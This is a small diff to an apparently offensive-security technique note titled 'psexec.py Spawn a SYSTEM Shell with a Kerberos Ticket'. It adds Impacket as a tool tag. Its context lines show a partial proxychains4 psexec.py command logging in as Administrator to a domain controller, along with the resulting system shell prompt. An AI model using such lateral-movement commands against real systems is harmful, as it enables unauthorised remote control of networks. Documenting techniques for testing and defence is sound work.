@@ -32,6 +32,8 @@ output: 'root@kali:~/Documents# proxychains4 -q psexec.py Administrator@dc01.ban
   C:\Windows\system32>'
 created_at: '2020-06-24T05:08:26.192791+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Impacket]]'
 ---
 
 # psexec.py Spawn a SYSTEM Shell with a Kerberos Ticket
